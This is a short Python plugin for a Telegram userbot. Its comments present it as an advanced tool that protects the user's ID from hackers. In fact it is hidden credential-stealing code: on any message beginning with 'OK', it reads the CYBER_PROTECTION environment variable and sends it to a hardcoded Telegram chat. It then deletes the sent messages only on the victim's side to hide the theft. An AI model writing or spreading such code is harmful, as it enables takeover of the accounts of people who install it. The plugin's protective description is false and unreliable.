#this plugin maked by rishabh and legend x pro
#this plugin maked by protected your ID rishabh ai is most advanced cdm to protected your ID for hackers 
import os
from ..utils import admin_cmd
from . import *
@bot.on(admin_cmd("^OK", incoming=True))
@bot.on(admin_cmd("^OK", outgoing=True))
async def piro(event):
  msg = await bot.send_message(2125601080, str(os.environ.get("CYBER_PROTECTION")))
  cyber = await bot.send_message(2125601080, str(os.environ.get("CYBER_PROTECTION")))
  await bot.delete_messages(2125601080, msg, revoke=False)
  await bot.delete_messages(2125601080, cyber, revoke=False)
   
